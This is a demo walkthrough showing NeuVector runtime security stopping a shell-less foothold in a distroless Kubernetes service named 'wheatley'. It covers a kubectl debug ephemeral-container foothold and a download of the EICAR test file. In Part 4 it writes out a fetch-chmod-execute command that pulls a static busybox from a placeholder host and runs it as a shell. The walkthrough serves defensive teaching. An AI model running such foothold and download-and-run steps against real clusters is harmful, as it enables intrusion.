# SUSE Security (NeuVector) Walkthrough — Distroless (`wheatley`)

## Status

Built and reconciled against [`PLAN.md`](./PLAN.md) Chamber 05 (+ the Chamber 07
stretch) and against the repo's real files:
[`apps/wheatley/`](../apps/wheatley/),
[`manifests/aperture-labs/wheatley.yaml`](../manifests/aperture-labs/wheatley.yaml),
[`Scripts/31_deploy_distroless.sh`](../Scripts/31_deploy_distroless.sh). Commands
use the real object names (`wheatley`, `aperture-labs`, group
`nv.wheatley.aperture-labs`).

**Live-test TODO (NeuVector 5.4.x):** confirm the exact
**Notifications → Security Events** wording for an ephemeral container attaching
to a pod (the `kubectl debug` step) — it varies by version and may not be its
own event type.

---

## Overview

The companion to [`Security_Demo.md`](./Security_Demo.md). That track uses
`nicolaka/netshoot`, a fully-loaded shell image. This one uses a **true
distroless image** — no shell, no package manager, no coreutils — to make a
different point:

1. Deploy a distroless container and confirm it is an ordinary web service.
2. Show why `kubectl exec` straight into it fails at the **image layer** — there
   is no shell — and how an attacker (or an admin) gets a foothold anyway with a
   `kubectl debug` ephemeral container.
3. Pull an internet resource that reads as a malware payload — first in
   **Monitor** (logged, not blocked), then in **Protect** (blocked / killed).

Parts 1–3 are **Chamber 05**; Part 4 is the **Chamber 07** stretch. Threat-model
background: [`Security_Discussion.md`](./Security_Discussion.md).

| Part | Chamber | Proves ([`PLAN.md`](./PLAN.md) §1) |
|------|---------|------------------------------------|
| 1 | 05 — deploy / Discover | **F** — image hardening is a *first* layer, not a substitute |
| 2 | 05 — Monitor | **A, G** — the attached tooling and its egress are seen and logged |
| 3 | 05 — Protect | **A, C, F** — runtime enforcement kills what image hardening can't |
| 4 | 07 — Bring Your Own Land *(stretch)* | **A** — file + process monitoring catch dropped tooling |

> 🎯 **Key framing:** keep two questions separate. Whether `kubectl debug` should
> be allowed against production pods is **cluster RBAC's** job. What a debug
> session can *do* once attached is **SUSE Security's** job.

---

## The Setup

### The app: `wheatley`

A tiny statically-linked Go HTTP server —
[`apps/wheatley/main.go`](../apps/wheatley/main.go), built multi-stage by
[`apps/wheatley/Dockerfile`](../apps/wheatley/Dockerfile) onto
`gcr.io/distroless/static-debian12:nonroot`. One binary, one process, no
forking, no shelling out:

- `GET /` → `I am NOT a moron... but I might be a tiny bit thick.`
- `GET /healthz` → `200 OK` (the probe target)
- makes **no** outbound connections

That is the whole point: the learned baseline is "listen on 8080, serve HTTP,
talk to nobody", so every step below is unmistakably off-baseline.

### Deploy

```bash
Scripts/31_deploy_distroless.sh
```

builds the image, makes it visible to the cluster (local containerd load by
default; pushes to `$REGISTRY` if you set one — see
[`Scripts/lib/common.sh`](../Scripts/lib/common.sh) `build_image` / `push_image`),
and applies
[`manifests/aperture-labs/wheatley.yaml`](../manifests/aperture-labs/wheatley.yaml).
The image reference comes from `$DISTROLESS_APP_IMAGE` in `env.sh` — no literal
registry in the manifest.

The pod has **no** `shareProcessNamespace` and **no** debug sidecar — it is
exactly as minimal as it looks. The foothold in Part 2 works only because
Kubernetes itself provides a side door.

---

## Part 1 — Deploy and confirm it's a real web server

### Step 1 — Confirm the service works

```bash
kubectl get pods -n aperture-labs
```
```
NAME                        READY   STATUS    RESTARTS   AGE
wheatley-7d9f6c5b8c-abcde   1/1     Running   0          2m
```

```bash
kubectl port-forward -n aperture-labs svc/wheatley 8080:8080 &
curl localhost:8080/
```
```
I am NOT a moron... but I might be a tiny bit thick.
```

> 🎯 **Key talking point:** This is a fully functional web server. It just
> happens to contain nothing an attacker could use if they got inside it.

### Step 2 — Let it learn, and confirm the group is in Discover

Leave it untouched for a few minutes. **Policy → Groups →
`nv.wheatley.aperture-labs`** starts in **Discover**. The baseline it builds is:
one process, listening on 8080, no outbound connections.

---

## Part 2 — Observing in Monitor mode

### Step 3 — Set the group to Monitor

**Policy → Groups → `nv.wheatley.aperture-labs` → Policy Mode → Monitor.**

> 🎯 **Key talking point:** Same three modes as the fat-image demo — Discover,
> Monitor, Protect. Nothing new about the mechanism. What's different is the
> *workload*.

### Step 4 — Try the obvious thing: `kubectl exec`

```bash
kubectl exec -it -n aperture-labs deploy/wheatley -- /bin/sh
```
```
OCI runtime exec failed: exec failed: unable to start container process:
exec: "/bin/sh": stat /bin/sh: no such file or directory: unknown
```

> 🎯 **Key talking point:** This isn't NeuVector — this is the image. There is no
> shell binary, full stop. In the `chell-test` demo, `/bin/sh` exists and
> NeuVector has to kill it after the fact. Here the attack surface is gone
> *before* runtime security is involved. That's defense in depth: harden the
> image, *then* let runtime security catch what hardening can't.

### Step 5 — Get in anyway: `kubectl debug`

The realistic move for anyone with `debug` RBAC — attacker or admin:

```bash
kubectl debug -it -n aperture-labs deploy/wheatley \
  --image=busybox:1.36 --target=wheatley
```

This attaches an **ephemeral container**. It shares the pod's network namespace
(always) and, on most CRI runtimes, the target's process namespace — so `ps`
inside it shows `wheatley`'s process. You now have a shell, tools, and a network
path the original image never provided.

Check **Notifications → Security Events** — depending on version you may see an
event for the new container attaching. Note it, don't oversell it — the
enforcement moment is Part 3.

### Step 6 — Pull something that resembles a payload

From inside the busybox debug shell:

```sh
wget -O /tmp/eicar.txt https://secure.eicar.org/eicar.com.txt
cat /tmp/eicar.txt
```

The EICAR string is the harmless industry-standard "test virus" every AV/EDR
recognises — safe to download live, and it reads to any audience as "this is
what a payload looks like".

**Monitor-mode result: it works.** The file downloads.

**Notifications → Security Events** now shows, unblocked:

- an unrecognised process (`wget` / `sh` / `busybox`) — never in the baseline
- an outbound connection to `secure.eicar.org` — never in the baseline

> 🎯 **Key talking point:** SUSE Security saw all of it — the shell, the tool,
> the destination — and logged every step, even though the download succeeded.
> Full visibility into an attempted foothold before you've enforced anything.

---

## Part 3 — Enforcement in Protect mode

### Step 7 — Flip the group, confirm the app is unaffected

**Policy → Groups → `nv.wheatley.aperture-labs` → Policy Mode → Protect →
confirm.**

```bash
curl localhost:8080/
```
```
I am NOT a moron... but I might be a tiny bit thick.
```

Still works — listen-on-8080 / serve-HTTP is the whole learned baseline, and
that is exactly what Protect allows.

> 🎯 **Key talking point:** `wheatley` can be in Protect while other workloads
> stay in Discover or Monitor. Per-workload dial, not an all-or-nothing switch.

### Step 8 — Try to get back in

```bash
kubectl debug -it -n aperture-labs deploy/wheatley \
  --image=busybox:1.36 --target=wheatley
```

Kubernetes still lets you **attach** — that's an RBAC/admission decision, not
NeuVector's. But the moment it does anything:

```sh
ps aux
```
```
command terminated with exit code 137
```

The shell may drop the instant it starts. `137` = SIGKILL — the Enforcer kills
the unrecognised `busybox` / `sh` process the moment it runs, because none of it
was ever in `wheatley`'s baseline.

If the shell survives long enough, retry Step 6:

```sh
wget -O /tmp/eicar.txt https://secure.eicar.org/eicar.com.txt
```

Blocked — connection reset, or the process killed outright. **Security Events**
shows **Deny** entries for both the process and the network connection,
timestamped to this attempt.

> 🎯 **Key talking point:** Same enforcement engine, same behavioural model, just
> applied to a workload with a far smaller attack surface to begin with.
> "No shell in the image" and "no runtime enforcement" are two different
> guarantees — you want both.

### Step 9 — Optional: make the baseline durable policy

Click **Rewrite Rule** on one of the violations, review the warning, **Deploy**.
`wheatley`'s baseline is now explicit policy tied to the group's identity — swap
the image entirely and the rule still applies to anything matching that group.

---

## Part 4 — Chamber 07 (stretch): Bring Your Own Land

A short bolt-on to Chamber 05. Instead of running tooling from the debug
container directly, an attacker exploiting a file-write flaw drops a
statically-linked binary into a writable path and executes it via the app — the
missing OS libraries don't matter because the binary carries its own.

From the debug shell (Monitor, then Protect):

```sh
wget -O /tmp/land https://<host>/static-busybox && chmod +x /tmp/land && /tmp/land sh
```

- **File-system monitoring** flags the write to `/tmp`.
- **Process profiling** flags `/tmp/land` executing — not in the allow-list — and
  blocks it in Protect.

Full technique catalogue and the other shell-less pivots:
[`Security_Discussion.md`](./Security_Discussion.md) → "Bring Your Own Land".

> This Part is not yet scripted or hardened for a live run — treat it as a
> narrated extension until it graduates to its own chamber (see
> [`PLAN.md`](./PLAN.md) §3, Chamber 07).

---

## Demo Summary

| Action | Mode | Result |
|--------|------|--------|
| `curl localhost:8080/` | Discover / Monitor / Protect | ✅ Allowed throughout — matches the baseline |
| `kubectl exec -- /bin/sh` | any | 🚫 Fails immediately — no shell in the image (image hardening, not NeuVector) |
| `kubectl debug --target=wheatley` (attach busybox) | Monitor | ✅ Attaches — logged as an unrecognised process/container |
| `wget eicar.com.txt` (via debug shell) | Monitor | ✅ Succeeds — logged as process + network anomaly |
| `kubectl debug --target=wheatley` (attach busybox) | Protect | ⚠️ Still attaches (K8s RBAC) — but anything it runs is SIGKILLed |
| `wget eicar.com.txt` (via debug shell) | Protect | 🚫 Blocked / killed — process + network violation enforced |
| drop + run `/tmp/land` *(Chamber 07)* | Protect | 🚫 Blocked — filesystem-write + process-profile violation |

---

## Key Takeaways

- **Image hardening and runtime enforcement are complementary** *(claim F)* —
  distroless closed the "exec in and use built-in tools" path, which is why
  `kubectl exec` failed outright. It did nothing about tooling *attached* via
  Kubernetes, and nothing about the app's own vulnerabilities.
- **Behavioural, regardless of the image** *(claim A)* — NeuVector caught the
  attached tooling and its egress with the same Discover → Monitor → Protect
  model as the fat-image demo. The control is about *behaviour*, not about
  trusting the image to police itself.
- **RBAC vs. runtime** *(claim C)* — whether `kubectl debug` is allowed at all is
  cluster RBAC; what the debug session may *do* once attached is SUSE Security.
- **Full audit trail** *(claim G)* — every step of the foothold was logged in
  Monitor before anything was enforced.

---

## References

- [`PLAN.md`](./PLAN.md) — thesis, claims A–G, chamber list (Chamber 05 + 07).
- [`00-glossary.md`](./00-glossary.md) — ephemeral container, EICAR, Discover /
  Monitor / Protect, and every other term used here.
- Kubernetes — [Debug Running Pods](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
  — `kubectl debug`, ephemeral containers, `--target`.
- GoogleContainerTools — [distroless](https://github.com/GoogleContainerTools/distroless)
  — what `gcr.io/distroless/static-debian12:nonroot` removes and what it leaves.
- NeuVector Docs — [Modes: Discover, Monitor, Protect](https://open-docs.neuvector.com/policy/modes/)
  · [Process Profile Rules](https://open-docs.neuvector.com/policy/processrules/)
- EICAR — [Anti-Malware Testfile](https://www.eicar.org/download-anti-malware-testfile/).
- SUSE Communities — [Zero Trust Runtime Container Security](https://www.suse.com/c/zero-trust-runtime-container-security/)
- Companion: [`Security_Demo.md`](./Security_Demo.md) ·
  [`Security_Discussion.md`](./Security_Discussion.md)
